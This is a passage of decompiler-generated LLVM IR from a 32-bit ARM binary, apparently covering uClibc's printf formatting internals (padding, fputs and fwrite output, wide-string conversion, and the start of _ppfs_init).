  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_109a0

dec_label_pc_108a4:                               ; preds = %dec_label_pc_10874, %dec_label_pc_107f4
  %v3_108a4 = load i32, i32* %stack_var_-348, align 4
  %v1_108a8 = icmp slt i32 %v3_108a4, 0
  br i1 %v1_108a8, label %dec_label_pc_108c0, label %dec_label_pc_108b0

dec_label_pc_108b0:                               ; preds = %dec_label_pc_108a4
  %tmp212 = icmp ult i32 %v3_108a4, 6
  br i1 %tmp212, label %dec_label_pc_108c8, label %dec_label_pc_108c0

dec_label_pc_108c0:                               ; preds = %dec_label_pc_108b0, %dec_label_pc_108a4
  br label %dec_label_pc_108c8

dec_label_pc_108c8:                               ; preds = %dec_label_pc_108b0, %dec_label_pc_108c0
  %storemerge97 = phi i32 [ 6, %dec_label_pc_108c0 ], [ 0, %dec_label_pc_108b0 ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 0, i32* @r8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -37052), i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  br label %dec_label_pc_109a0

dec_label_pc_108d8:                               ; preds = %dec_label_pc_1086c
  store i32 %v2_10874, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 1, i32* @r5, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v2_1090c, i32* @r4, align 4
  store i32 %v2_10874, i32* %stack_var_-200, align 4
  br label %dec_label_pc_109a0thread-pre-split

dec_label_pc_10900:                               ; preds = %dec_label_pc_10864
  br i1 %v7_10900, label %dec_label_pc_10908, label %dec_label_pc_10924

dec_label_pc_10908:                               ; preds = %dec_label_pc_10900
  %v0_10908 = call i32 @__GI___errno_location()
  store i32 %v0_10908, i32* %r0.global-to-local, align 4
  %v1_10910 = inttoptr i32 %v0_10908 to i32*
  %v2_10910 = load i32, i32* %v1_10910, align 4
  store i32 %v2_10910, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  %v3_10918 = call i32 @__GI___glibc_strerror_r(i32 %v2_10910, i32 %v2_1090c, i32 128)
  store i32 %v3_10918, i32* %r0.global-to-local, align 4
  store i32 %v3_10918, i32* @r4, align 4
  br label %dec_label_pc_10880

dec_label_pc_10924:                               ; preds = %dec_label_pc_10900
  %v4_1092c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 2152) to i32*), align 4
  %v1_10934 = add i32 %v4_1092c, 10
  store i32 %v1_10934, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10938

dec_label_pc_10938:                               ; preds = %dec_label_pc_10980, %dec_label_pc_10924
  %v1_10948 = phi i32 [ %v1_10980, %dec_label_pc_10980 ], [ %v4_1092c, %dec_label_pc_10924 ]
  %v1_10938 = inttoptr i32 %v1_10948 to i8*
  %v2_10938 = load i8, i8* %v1_10938, align 1
  %v3_10938 = zext i8 %v2_10938 to i32
  store i32 %v3_10938, i32* %r2.global-to-local, align 4
  %v9_10940 = icmp eq i32 %v3_10938, %tmp99
  br i1 %v9_10940, label %dec_label_pc_10948, label %dec_label_pc_10980

dec_label_pc_10948:                               ; preds = %dec_label_pc_10938
  %v2_10948 = sub i32 %v1_10948, %v4_1092c
  %v0_1094c = load i32, i32* @fp, align 4
  store i32 %v0_1094c, i32* %r0.global-to-local, align 4
  store i32 %v2_10954, i32* %r2.global-to-local, align 4
  %v4_1095c = mul i32 %v2_10948, 4
  %v5_1095c = add i32 %v4_1095c, add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 27704)
  %v6_1095c = inttoptr i32 %v5_1095c to i32*
  %v7_1095c = load i32, i32* %v6_1095c, align 4
  store i32 %v7_1095c, i32* @ip, align 4
  store i32 67944, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_1095c)
  %v0_10968 = load i32, i32* %r0.global-to-local, align 4
  %v1_10968 = icmp slt i32 %v0_10968, 0
  br i1 %v1_10968, label %dec_label_pc_10af8, label %dec_label_pc_10970

dec_label_pc_10970:                               ; preds = %dec_label_pc_10948
  %v2_10974 = add i32 %v0_10968, %v1_109d0
  br label %dec_label_pc_10ae4

dec_label_pc_10980:                               ; preds = %dec_label_pc_10938
  %v1_10980 = add i32 %v1_10948, 1
  %v3_10984 = icmp ult i32 %v1_10980, %v1_10934
  br i1 %v3_10984, label %dec_label_pc_10938, label %dec_label_pc_10af8

dec_label_pc_10990:                               ; preds = %dec_label_pc_10804
  %v0_10990 = load i32, i32* @sl, align 4
  store i32 %v0_10990, i32* @r8, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_10990, i32* @r4, align 4
  br label %dec_label_pc_109a0

dec_label_pc_109a0thread-pre-split:               ; preds = %.thread85, %dec_label_pc_10794, %dec_label_pc_1084c, %dec_label_pc_108d8
  %v1_109a4.pre = phi i32 [ %v1_109a4.pre205, %dec_label_pc_10794 ], [ %v1_109a4.pre.pre, %dec_label_pc_1084c ], [ 1, %dec_label_pc_108d8 ], [ %v2_10714, %.thread85 ]
  %v0_109a4.pre = phi i32 [ 0, %dec_label_pc_10794 ], [ %v0_109a4.pre.pre, %dec_label_pc_1084c ], [ 0, %dec_label_pc_108d8 ], [ %v2_10788, %.thread85 ]
  %stack_var_-336.3.ph = phi i32 [ %v0_10708, %dec_label_pc_10794 ], [ %v0_10638, %dec_label_pc_1084c ], [ %v0_10638, %dec_label_pc_108d8 ], [ %v0_10708, %.thread85 ]
  %v0_109a0.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_109a0

dec_label_pc_109a0:                               ; preds = %dec_label_pc_109a0thread-pre-split, %dec_label_pc_108c8, %dec_label_pc_10880, %dec_label_pc_10990
  %v1_109a4 = phi i32 [ %v1_109a4.pre, %dec_label_pc_109a0thread-pre-split ], [ %storemerge97, %dec_label_pc_108c8 ], [ %v3_1088c, %dec_label_pc_10880 ], [ %v6_10818, %dec_label_pc_10990 ]
  %v0_109a4 = phi i32 [ %v0_109a4.pre, %dec_label_pc_109a0thread-pre-split ], [ 0, %dec_label_pc_108c8 ], [ 0, %dec_label_pc_10880 ], [ %v0_10990, %dec_label_pc_10990 ]
  %v0_109ac = phi i32 [ %v0_109a0.pr, %dec_label_pc_109a0thread-pre-split ], [ 11, %dec_label_pc_108c8 ], [ 11, %dec_label_pc_10880 ], [ 11, %dec_label_pc_10990 ]
  %v0_109ec = phi i32 [ %stack_var_-336.3.ph, %dec_label_pc_109a0thread-pre-split ], [ %v0_10638, %dec_label_pc_108c8 ], [ %v0_10638, %dec_label_pc_10880 ], [ %v0_10638, %dec_label_pc_10990 ]
  %v7_109a0 = icmp eq i32 %v0_109ac, 11
  %v2_109a4 = add i32 %v1_109a4, %v0_109a4
  br i1 %v7_109a0, label %dec_label_pc_109bc, label %bb173

bb173:                                            ; preds = %dec_label_pc_109a0
  %v7_109b4 = icmp sgt i32 %v0_109ac, 5
  %. = select i1 %v7_109b4, i32 2, i32 1
  %v2_109b8 = add i32 %v2_109a4, %.
  br label %dec_label_pc_109bc

dec_label_pc_109bc:                               ; preds = %dec_label_pc_109a0, %bb173
  %v0_109d0 = phi i32 [ %v2_109a4, %dec_label_pc_109a0 ], [ %v2_109b8, %bb173 ]
  store i32 %tmp98, i32* %r2.global-to-local, align 4
  %v3_109c0 = icmp uge i32 %tmp98, %v0_109d0
  %v9_109c0 = icmp eq i32 %tmp98, %v0_109d0
  %v2_109c4 = xor i1 %v9_109c0, true
  %v3_109c4 = and i1 %v3_109c0, %v2_109c4
  br i1 %v3_109c4, label %bb174, label %bb175

bb174:                                            ; preds = %dec_label_pc_109bc
  %v2_109c0 = sub i32 %tmp98, %v0_109d0
  store i32 %v2_109c0, i32* @sl, align 4
  br label %bb175

bb175:                                            ; preds = %dec_label_pc_109bc, %bb174
  store i32 %v1_109d0, i32* %r2.global-to-local, align 4
  %v2_109cc = xor i1 %v3_109c0, true
  %v3_109cc = or i1 %v9_109c0, %v2_109cc
  br i1 %v3_109cc, label %bb176, label %._crit_edge

._crit_edge:                                      ; preds = %bb175
  %v1_109d4.pre = load i32, i32* @sl, align 4
  br label %bb177

bb176:                                            ; preds = %bb175
  store i32 0, i32* @sl, align 4
  br label %bb177

bb177:                                            ; preds = %._crit_edge, %bb176
  %v2_109e4 = phi i32 [ %v1_109d4.pre, %._crit_edge ], [ 0, %bb176 ]
  %v2_109d0 = add i32 %v0_109d0, %v1_109d0
  %v2_109d4 = add i32 %v2_109d0, %v2_109e4
  %v0_109e0 = load i32, i32* @sb, align 4
  %v7_109e0 = icmp eq i32 %v0_109e0, 48
  br i1 %v7_109e0, label %bb178, label %.thread30

bb178:                                            ; preds = %bb177
  %v3_109e4 = add i32 %v2_109e4, %v0_109a4
  store i32 %v3_109e4, i32* @r8, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread30

.thread30:                                        ; preds = %bb177, %bb178
  %v0_109fc = phi i32 [ %v2_109e4, %bb177 ], [ 0, %bb178 ]
  %v1_109ec = and i32 %v0_109ec, 8
  store i32 %v1_109ec, i32* @r7, align 4
  %v2_109ec = icmp eq i32 %v1_109ec, 0
  br i1 %v2_109ec, label %dec_label_pc_109f4, label %dec_label_pc_10a10

dec_label_pc_109f4:                               ; preds = %.thread30
  %v0_109f4 = load i32, i32* @fp, align 4
  store i32 %v0_109f4, i32* %r0.global-to-local, align 4
  store i32 %v0_109fc, i32* %r2.global-to-local, align 4
  %v4_10a00 = call i32 @_charpad(i32 %v0_109f4, i8 32, i32 %v0_109fc)
  store i32 %v4_10a00, i32* %r0.global-to-local, align 4
  %v1_10a04 = load i32, i32* @sl, align 4
  %v9_10a04 = icmp eq i32 %v4_10a00, %v1_10a04
  br i1 %v9_10a04, label %dec_label_pc_10a0c, label %dec_label_pc_10af8

dec_label_pc_10a0c:                               ; preds = %dec_label_pc_109f4
  %v0_10a0c = load i32, i32* @r7, align 4
  store i32 %v0_10a0c, i32* @sl, align 4
  %v0_10a18.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_10a10

dec_label_pc_10a10:                               ; preds = %.thread30, %dec_label_pc_10a0c
  %v0_10a18 = phi i32 [ %v0_109ac, %.thread30 ], [ %v0_10a18.pre, %dec_label_pc_10a0c ]
  %v0_10a14 = load i32, i32* @fp, align 4
  %v2_10a18 = add i32 %v0_10a18, add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -37044)
  store i32 %v2_10a18, i32* %r0.global-to-local, align 4
  %v2_10a1c = inttoptr i32 %v2_10a18 to i8*
  %v3_10a1c = call i32 @__GI_fputs_unlocked(i8* %v2_10a1c, i32 %v0_10a14)
  %v0_10a20 = load i32, i32* @fp, align 4
  store i32 %v0_10a20, i32* %r0.global-to-local, align 4
  %v0_10a28 = load i32, i32* @r8, align 4
  store i32 %v0_10a28, i32* %r2.global-to-local, align 4
  %v4_10a2c = call i32 @_charpad(i32 %v0_10a20, i8 48, i32 %v0_10a28)
  store i32 %v4_10a2c, i32* %r0.global-to-local, align 4
  %v1_10a30 = load i32, i32* @r8, align 4
  %v9_10a30 = icmp eq i32 %v4_10a2c, %v1_10a30
  br i1 %v9_10a30, label %dec_label_pc_10a38, label %dec_label_pc_10af8

dec_label_pc_10a38:                               ; preds = %dec_label_pc_10a10
  %v3_10a38 = load i32, i32* %stack_var_-44, align 4
  %v2_10a3c = icmp eq i32 %v3_10a38, 0
  br i1 %v2_10a3c, label %dec_label_pc_10a44, label %dec_label_pc_10a68

dec_label_pc_10a44:                               ; preds = %dec_label_pc_10a38
  %v0_10a44 = load i32, i32* @r5, align 4
  %v2_10a44 = icmp eq i32 %v0_10a44, 0
  br i1 %v2_10a44, label %dec_label_pc_10acc, label %dec_label_pc_10a4c

dec_label_pc_10a4c:                               ; preds = %dec_label_pc_10a44
  %v0_10a4c = load i32, i32* @r4, align 4
  store i32 %v0_10a4c, i32* %r0.global-to-local, align 4
  %v0_10a54 = load i32, i32* @fp, align 4
  store i32 %v0_10a54, i32* %r2.global-to-local, align 4
  %v3_10a58 = inttoptr i32 %v0_10a54 to i16*
  %v4_10a58 = call i32 @__stdio_fwrite(i32 %v0_10a4c, i32 %v0_10a44, i16* %v3_10a58)
  store i32 %v4_10a58, i32* %r0.global-to-local, align 4
  %v1_10a5c = load i32, i32* @r5, align 4
  %v9_10a5c = icmp eq i32 %v4_10a58, %v1_10a5c
  br i1 %v9_10a5c, label %dec_label_pc_10acc, label %dec_label_pc_10af8

dec_label_pc_10a68:                               ; preds = %dec_label_pc_10a38
  store i32 %v2_1090c, i32* @r6, align 4
  store i32 %v2_10808, i32* @r8, align 4
  store i32 %v2_10814, i32* @r7, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_10ab8.pr = load i32, i32* @r5, align 4
  %v2_10ab841 = icmp eq i32 %v0_10ab8.pr, 0
  store i32 %v2_10808, i32* @r1, align 4
  store i32 %v2_1090c, i32* @r0, align 4
  br i1 %v2_10ab841, label %dec_label_pc_10acc, label %dec_label_pc_10a80

dec_label_pc_10a80:                               ; preds = %dec_label_pc_10a68, %dec_label_pc_10ab4
  %v1_10a84 = phi i32 [ %v2_10ab4, %dec_label_pc_10ab4 ], [ %v0_10ab8.pr, %dec_label_pc_10a68 ]
  %v2_10a80 = icmp ult i32 %v1_10a84, 128
  %.v1_10a84 = select i1 %v2_10a80, i32 %v1_10a84, i32 128
  store i32 %.v1_10a84, i32* %r2.global-to-local, align 4
  %v6_10a8c = call i32 @__GI_wcsrtombs(i32 %v2_1090c, i32 %v2_10808, i32 %.v1_10a84, i32 %v2_10814, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_10a8c, i32* @r4, align 4
  %v2_10a90 = icmp eq i32 %v6_10a8c, 0
  store i32 %v6_10a8c, i32* %r0.global-to-local, align 4
  br i1 %v2_10a90, label %dec_label_pc_10ab4, label %dec_label_pc_10a9c

dec_label_pc_10a9c:                               ; preds = %dec_label_pc_10a80
  store i32 %v2_1090c, i32* %r0.global-to-local, align 4
  %v0_10aa4 = load i32, i32* @fp, align 4
  store i32 %v0_10aa4, i32* %r2.global-to-local, align 4
  %v3_10aa8 = inttoptr i32 %v0_10aa4 to i16*
  %v4_10aa8 = call i32 @__stdio_fwrite(i32 %v2_1090c, i32 %v6_10a8c, i16* %v3_10aa8)
  store i32 %v4_10aa8, i32* %r0.global-to-local, align 4
  %v1_10aac = load i32, i32* @r4, align 4
  %v9_10aac = icmp eq i32 %v4_10aa8, %v1_10aac
  br i1 %v9_10aac, label %dec_label_pc_10ab4, label %dec_label_pc_10af8

dec_label_pc_10ab4:                               ; preds = %dec_label_pc_10a9c, %dec_label_pc_10a80
  %v0_10ab4 = phi i32 [ %v4_10aa8, %dec_label_pc_10a9c ], [ 0, %dec_label_pc_10a80 ]
  %v1_10ab4 = load i32, i32* @r5, align 4
  %v2_10ab4 = sub i32 %v1_10ab4, %v0_10ab4
  store i32 %v2_10ab4, i32* @r5, align 4
  %v2_10ab8 = icmp eq i32 %v2_10ab4, 0
  store i32 %v2_10808, i32* @r1, align 4
  store i32 %v2_1090c, i32* @r0, align 4
  br i1 %v2_10ab8, label %dec_label_pc_10acc, label %dec_label_pc_10a80

dec_label_pc_10acc:                               ; preds = %dec_label_pc_10ab4, %dec_label_pc_10a68, %dec_label_pc_10a4c, %dec_label_pc_10a44
  %v0_10acc = load i32, i32* @fp, align 4
  store i32 %v0_10acc, i32* %r0.global-to-local, align 4
  %v0_10ad4 = load i32, i32* @sl, align 4
  store i32 %v0_10ad4, i32* %r2.global-to-local, align 4
  %v4_10ad8 = call i32 @_charpad(i32 %v0_10acc, i8 32, i32 %v0_10ad4)
  store i32 %v4_10ad8, i32* %r0.global-to-local, align 4
  %v1_10adc = load i32, i32* @sl, align 4
  %v9_10adc = icmp eq i32 %v4_10ad8, %v1_10adc
  br i1 %v9_10adc, label %dec_label_pc_10ae4, label %dec_label_pc_10af8

dec_label_pc_10ae4:                               ; preds = %dec_label_pc_10acc, %dec_label_pc_10970, %dec_label_pc_107cc, %dec_label_pc_105dc
  %stack_var_-336.4 = phi i32 [ %v0_10638, %dec_label_pc_105dc ], [ %v0_109ec, %dec_label_pc_10acc ], [ %v0_10638, %dec_label_pc_10970 ], [ %v0_10638, %dec_label_pc_107cc ]
  %stack_var_-356.3 = phi i32 [ %v1_109d0, %dec_label_pc_105dc ], [ %v2_109d4, %dec_label_pc_10acc ], [ %v2_10974, %dec_label_pc_10970 ], [ %v2_107d0, %dec_label_pc_107cc ]
  %v3_10ae4 = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_10ae4, i32* @r4, align 4
  store i32 %v3_10ae4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10504.outer

dec_label_pc_10af0:                               ; preds = %dec_label_pc_10560
  %v1_10af0 = add i32 %v0_10568, 2
  store i32 %v1_10af0, i32* @r4, align 4
  br label %dec_label_pc_10504.outer36

dec_label_pc_10af8:                               ; preds = %dec_label_pc_10980, %dec_label_pc_10804, %dec_label_pc_10acc, %dec_label_pc_10a4c, %dec_label_pc_10a10, %dec_label_pc_109f4, %dec_label_pc_10948, %dec_label_pc_1082c, %dec_label_pc_107a4, %bb142, %dec_label_pc_10a9c
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_10b00

dec_label_pc_10b00:                               ; preds = %dec_label_pc_10554, %bb, %dec_label_pc_10498, %dec_label_pc_10af8
  %stack_var_-356.4 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_10498 ], [ -1, %dec_label_pc_10af8 ], [ %v1_109d0, %dec_label_pc_10554 ]
  store i32 %stack_var_-356.4, i32* %r0.global-to-local, align 4
  store i32 %v6_10448, i32* @r5, align 4
  store i32 %v12_10448, i32* %r7.global-to-local, align 4
  store i32 %v18_10448, i32* @sb, align 4
  store i32 %v21_10448, i32* @sl, align 4
  store i32 %v24_10448, i32* @fp, align 4
  ret i32 %stack_var_-356.4

; uselistorder directives
  uselistorder i32 %stack_var_-356.4, { 1, 0 }
  uselistorder i32 %v1_10af0, { 1, 0 }
  uselistorder i32 %v3_10ae4, { 1, 2, 0 }
  uselistorder i32 %v2_10ab4, { 1, 2, 0 }
  uselistorder i32 %v0_109fc, { 1, 0 }
  uselistorder i32 %v2_109e4, { 2, 0, 1 }
  uselistorder i1 %v9_109c0, { 1, 0 }
  uselistorder i32 %v2_109a4, { 1, 0 }
  uselistorder i32 %v0_109ec, { 1, 0 }
  uselistorder i32 %v0_109a4, { 1, 0 }
  uselistorder i32 %v1_10980, { 1, 0 }
  uselistorder i32 %v1_10948, { 1, 0, 2 }
  uselistorder i32 %v3_10918, { 1, 2, 0 }
  uselistorder i32 %v0_10884, { 1, 0 }
  uselistorder i32 %v2_10874, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_1083c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_107b4, { 1, 0 }
  uselistorder i32 %v2_10714, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 %v0_10730, { 1, 2, 3, 0 }
  uselistorder i32 %v2_106b0, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_10618, { 0, 2, 1, 3 }
  uselistorder i32 %v1_105bc.pre, { 1, 0, 2 }
  uselistorder i32 %v1_105b4, { 1, 0 }
  uselistorder i32 %v1_10560, { 0, 1, 3, 2 }
  uselistorder i32 %v1_109d0, { 0, 8, 1, 7, 2, 3, 6, 5, 4, 9, 10 }
  uselistorder i32 %v2_10520, { 1, 0 }
  uselistorder i32 %v1_10518.lcssa, { 1, 0 }
  uselistorder i8 %v2_10504, { 1, 0 }
  uselistorder i32 %v2_10518, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-356.1.ph37, { 1, 0 }
  uselistorder i32 %v5_10530, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10638, { 6, 4, 3, 15, 14, 5, 0, 1, 13, 12, 11, 7, 10, 8, 2, 9 }
  uselistorder i1 %v7_10728, { 1, 0 }
  uselistorder i1 %v7_10678, { 1, 2, 0 }
  uselistorder i1 %v7_10864, { 1, 0 }
  uselistorder i1 %v7_107dc, { 1, 0 }
  uselistorder i1 %v7_106b8, { 1, 0 }
  uselistorder i32 %v2_10814, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_10808, { 1, 2, 3, 0, 6, 4, 5, 7 }
  uselistorder i32 %v2_1090c, { 1, 2, 3, 4, 5, 0, 11, 10, 9, 7, 8, 6 }
  uselistorder i32 %v2_105b8, { 1, 3, 2, 0 }
  uselistorder i32 %v4_10594, { 1, 0 }
  uselistorder i32 %v2_10450, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-352, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 %tmp105, { 1, 2, 0 }
  uselistorder i32 %tmp104, { 12, 8, 9, 0, 10, 11, 3, 4, 5, 6, 7, 1, 2, 15, 14, 13 }
  uselistorder i32 %tmp98, { 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 20, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 21, 22, 23, 24, 30, 31, 25, 26, 27, 28, 29, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 5, 8, 7, 9, 11, 10, 16, 12, 13, 14, 15, 17, 18, 21, 19, 20, 23, 22, 25, 24, 27, 26, 29, 28, 32, 30, 31, 35, 36, 33, 34, 46, 37, 47, 48, 39, 38, 41, 40, 43, 42, 45, 44, 0 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 -91504), { 1, 0 }
  uselistorder label %dec_label_pc_10b00, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10af8, { 2, 10, 3, 4, 5, 0, 6, 7, 1, 8, 9 }
  uselistorder label %dec_label_pc_10a80, { 1, 0 }
  uselistorder label %dec_label_pc_10a10, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
  uselistorder label %bb175, { 1, 0 }
  uselistorder label %dec_label_pc_109bc, { 1, 0 }
  uselistorder label %dec_label_pc_109a0, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_109a0thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_108c8, { 1, 0 }
  uselistorder label %dec_label_pc_10880, { 1, 0 }
  uselistorder label %dec_label_pc_10794, { 0, 2, 1 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 4, 1, 2, 0, 3 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb160, { 4, 3, 1, 0, 2 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %dec_label_pc_10668, { 1, 0 }
  uselistorder label %dec_label_pc_10664, { 2, 1, 0 }
  uselistorder label %bb151, { 2, 1, 0 }
  uselistorder label %dec_label_pc_105b0, { 1, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_10554, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %dec_label_pc_10520, { 1, 0, 2 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_10504.outer36, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_10b30 = load i32, i32* @r4, align 4
  %v6_10b30 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_10b3c = load i32, i32* @r1, align 4
  store i32 %v0_10b3c, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_10b48 = bitcast i32* %arg1 to i8*
  %v3_10b48 = call i32 @__GI_memset(i8* %v2_10b48, i32 0)
  store i32 %v3_10b48, i32* %r0.global-to-local, align 4
  %v0_10b4c = load i32, i32* @r4, align 4
  %v1_10b4c = add i32 %v0_10b4c, 24
  %v2_10b4c = inttoptr i32 %v1_10b4c to i32*
  %v3_10b4c = load i32, i32* %v2_10b4c, align 4
  store i32 %v3_10b4c, i32* %r3.global-to-local, align 4
  %v0_10b50 = load i32, i32* @r5, align 4
  %v2_10b50 = inttoptr i32 %v0_10b4c to i32*
  store i32 %v0_10b50, i32* %v2_10b50, align 4
  %v0_10b54 = load i32, i32* %r3.global-to-local, align 4
  %v1_10b54 = add i32 %v0_10b54, -1
  %v1_10b58 = load i32, i32* @r4, align 4
  %v2_10b58 = add i32 %v1_10b58, 24
  %v3_10b58 = inttoptr i32 %v2_10b58 to i32*
  store i32 %v1_10b54, i32* %v3_10b58, align 4
  %v0_10b5c = load i32, i32* @r4, align 4
  %v1_10b5c = add i32 %v0_10b5c, 40
  store i32 %v1_10b5c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_10b6c21 = inttoptr i32 %v1_10b5c to i32*
  store i32 8, i32* %v2_10b6c21, align 4
  %v3_10b6c22 = load i32, i32* %r2.global-to-local, align 4
  %v4_10b6c23 = add i32 %v3_10b6c22, 4
  store i32 %v4_10b6c23, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10b68.dec_label_pc_10b68_crit_edge

dec_label_pc_10b68.dec_label_pc_10b68_crit_edge:  ; preds = %entry, %dec_label_pc_10b68.dec_label_pc_10b68_crit_edge
  %v4_10b6c24 = phi i32 [ %v4_10b6c23, %entry ], [ %v4_10b6c, %dec_label_pc_10b68.dec_label_pc_10b68_crit_edge ]
  %v0_10b68.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10b6c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_10b68 = add i32 %v0_10b68.pre, -1
  store i32 %v1_10b68, i32* %r3.global-to-local, align 4
  %v7_10b68 = icmp eq i32 %v0_10b68.pre, 1
  %v2_10b6c = inttoptr i32 %v4_10b6c24 to i32*
  store i32 %v0_10b6c.pre, i32* %v2_10b6c, align 4
  %v3_10b6c = load i32, i32* %r2.global-to-local, align 4
  %v4_10b6c = add i32 %v3_10b6c, 4
  store i32 %v4_10b6c, i32* %r2.global-to-local, align 4
  br i1 %v7_10b68, label %dec_label_pc_10b74, label %dec_label_pc_10b68.dec_label_pc_10b68_crit_edge

dec_label_pc_10b74:                               ; preds = %dec_label_pc_10b68.dec_label_pc_10b68_crit_edge
  %v0_10b74 = load i32, i32* @r5, align 4
  store i32 %v0_10b74, i32* %r2.global-to-local, align 4
  %v1_10bb42 = inttoptr i32 %v0_10b74 to i8*
  %v2_10bb43 = load i8, i8* %v1_10bb42, align 1
  %v3_10bb44 = zext i8 %v2_10bb43 to i32
  store i32 %v3_10bb44, i32* %r0.global-to-local, align 4
  %v2_10bb85 = icmp eq i8 %v2_10bb43, 0
  br i1 %v2_10bb85, label %dec_label_pc_10bc0, label %dec_label_pc_10b7c

dec_label_pc_10b7c:                               ; preds = %dec_label_pc_10b74, %dec_label_pc_10bb4.backedge
  %v0_10b84 = phi i32 [ %storemerge, %dec_label_pc_10bb4.backedge ], [ %v0_10b74, %dec_label_pc_10b74 ]
  %v0_10b7c = phi i32 [ %v3_10bb4, %dec_label_pc_10bb4.backedge ], [ %v3_10bb44, %dec_label_pc_10b74 ]
  %v7_10b7c = icmp eq i32 %v0_10b7c, 37
  br i1 %v7_10b7c, label %dec_label_pc_10b84, label %dec_label_pc_10bb0

dec_label_pc_10b84:                               ; preds = %dec_label_pc_10b7c
  %v1_10b84 = add i32 %v0_10b84, 1
  %v2_10b84 = inttoptr i32 %v1_10b84 to i8*
  %v3_10b84 = load i8, i8* %v2_10b84, align 1
  %v4_10b84 = zext i8 %v3_10b84 to i32
  store i32 %v4_10b84, i32* %r3.global-to-local, align 4
  store i32 %v1_10b84, i32* %r2.global-to-local, align 4
  %v7_10b88 = icmp eq i8 %v3_10b84, 37
  br i1 %v7_10b88, label %dec_label_pc_10bb0, label %dec_label_pc_10b90

dec_label_pc_10b90:                               ; preds = %dec_label_pc_10b84
  %v1_10b90 = load i32, i32* @r4, align 4
  %v2_10b90 = inttoptr i32 %v1_10b90 to i32*
  store i32 %v1_10b84, i32* %v2_10b90, align 4
  %v0_10b94 = load i32, i32* @r4, align 4
  store i32 %v0_10b94, i32* %r0.global-to-local, align 4
  %v1_10b98 = inttoptr i32 %v0_10b94 to i8*
  %v2_10b98 = call i32 @_ppfs_parsespec(i8* %v1_10b98)
  store i32 %v2_10b98, i32* %r0.global-to-local, align 4
  %v1_10b9c = icmp slt i32 %v2_10b98, 0
  br i1 %v1_10b9c, label %dec_label_pc_10bc4.loopexit, label %dec_label_pc_10ba8

dec_label_pc_10ba8:                               ; preds = %dec_label_pc_10b90
  %v0_10ba8 = load i32, i32* @r4, align 4
  %v1_10ba8 = inttoptr i32 %v0_10ba8 to i32*
  %v2_10ba8 = load i32, i32* %v1_10ba8, align 4
  br label %dec_label_pc_10bb4.backedge

dec_label_pc_10bb0:                               ; preds = %dec_label_pc_10b7c, %dec_label_pc_10b84
  %v0_10bb0 = phi i32 [ %v0_10b84, %dec_label_pc_10b7c ], [ %v1_10b84, %dec_label_pc_10b84 ]
